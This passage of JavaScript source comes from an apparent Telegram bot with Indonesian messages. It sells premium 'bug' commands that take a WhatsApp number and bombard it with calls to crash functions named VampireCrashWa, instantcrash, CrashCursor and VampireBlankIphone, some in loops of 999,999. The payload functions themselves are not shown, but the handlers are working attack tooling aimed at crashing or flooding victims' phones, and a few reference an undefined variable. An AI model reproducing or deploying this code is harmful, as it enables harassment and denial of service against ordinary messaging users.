});

bot.command(
  "maleticload",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /IsagiIphone 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    try {
      for (let i = 0; i < 999999; i++) {
        await VampBroadcast(Dragon, target);
        await xatanicaldelay(Dragon, target);
        await protocolbug(Dragon, target);
        await protocolbug3(Dragon, target);
      }
      await donerespone(target, ctx);
    } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
  }
);

bot.command("overxiz", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 999999; i++) {
      await VampBroadcast(Dragon, target);
      await xatanicaldelay(Dragon, target);
      await protocolbug(Dragon, target);
      await protocolbug3(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("hardware", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("travasdex", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("xhunter", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await VampireInvisIos(Dragon, target);
      await VampireInvisIos(Dragon, target);
      await VampireBlankIphone(Dragon, target);
      await VampireCrashiPhone(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("crashline", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("trashvoc", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

const Dev_ID = 5053359392;
bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply("[❌ Format Salah!] Cobalah /broadcast (Pesan Anda)");
  }

  const footer = "\n\n🍂 Dikirim Oleh Kayzy";
  const finalMessage = message + footer;

  let successCount = 0;
  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, finalMessage, { parse_mode: "Markdown" });
      successCount++;
    } catch (error) {
      console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
    }
  }

  ctx.reply(`✅ Broadcast selesai! Pesan berhasil dikirim ke ${successCount} pengguna.`);
});

bot.command("dhoomshot", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command(
  "shooterkill",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /IsagiIphone 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    try {
      for (let i = 0; i < 20; i++) {
        await invis(Dragon, target);
        await invis(Dragon, target);
        await invis(Dragon, target);
        await invis(Dragon, target);
        await invis(Dragon, target);
        await VampireCrashTotal(Dragon, target);
        await VampireSuperUi(Dragon, target);
        await VampireCrashWa(Dragon, target);
        await VampireCrashTotal(Dragon, target);
        await VampireSuperUi(Dragon, target);
        await VampireCrashWa(Dragon, target);
        await VampireCrashTotal(Dragon, target);
        await VampireSuperUi(Dragon, target);
        await VampireCrashWa(Dragon, target);
        await VampireCrashTotal(Dragon, target);
        await VampireBlank(Dragon, target);
        await VampireSuperUi(Dragon, target);
        await VampireSpamNotif(Dragon, target);
        await VampireNewUi(Dragon, target);
        await VampireSuperUi(Dragon, target);
        await VampireCrashWa(Dragon, target);
        await VampireNewUi(Dragon, target);
        await VampireSuperUi(Dragon, target);
        await VampireCrashWa(Dragon, target);
        await VampireSuperUi(Dragon, target);
        await VampireCrashTotal(Dragon, target);
        await instantcrash(Dragon, target);
        await instantcrash(Dragon, target);
        await instantcrash(Dragon, target);
        await invis(Dragon, target);
        await instantcrash(Dragon, target);
        await invisPayload(Dragon, target);
        await instantcrash(Dragon, target);
        await CrashCursor(Dragon, target);
        await instantcrash(Dragon, target);
        await invisPayload(Dragon, target);
        await instantcrash(Dragon, target);
        await CrashCursor(Dragon, target);
        await instantcrash(Dragon, target);
        await invisPayload(Dragon, target);
        await instantcrash(Dragon, target);
        await CrashCursor(Dragon, target);
        await instantcrash(Dragon, target);
        await invisPayload(Dragon, target);
        await instantcrash(Dragon, target);
        await CrashCursor(Dragon, target);
        await instantcrash(Dragon, target);
        await invisPayload(Dragon, target);
        await instantcrash(Dragon, target);
        await CrashCursor(Dragon, target);
        await instantcrash(Dragon, target);
        await invisPayload(Dragon, target);
        await instantcrash(Dragon, target);
        await CrashCursor(Dragon, target);
        await instantcrash(Dragon, target);
        await invisPayload(Dragon, target);
        await instantcrash(Dragon, target);
        await CrashCursor(Dragon, target);
      }
      await donerespone(target, ctx);
    } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
  }
);

bot.command("floids", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("vcoxphone", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 50; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("travesium", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await VampireNewSticker(Dragon, target);
      await VampireSticker(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("invshome", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("deathline", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    for (let i = 0; i < 20; i++) {
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await invis(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await VampireBlank(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireSpamNotif(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireNewUi(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashWa(Dragon, target);
      await VampireSuperUi(Dragon, target);
      await VampireCrashTotal(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await instantcrash(Dragon, target);
      await invis(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
      await instantcrash(Dragon, target);
      await invisPayload(Dragon, target);
      await instantcrash(Dragon, target);
      await CrashCursor(Dragon, target);
    }
    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});

bot.command("destroy ", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    await VampireNewBug(formatedNumber);

    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});
bot.command("jailbrek", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    await VampCrashUi(formatedNumber);
    await VampireSpecial(formatedNumber);
    await VampCrashChat(formatedNumber);

    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});
bot.command("infinity", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    await VampCrashUi(formatedNumber);
    await VampireSpecial(formatedNumber);
    await VampCrashChat(formatedNumber);

    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});
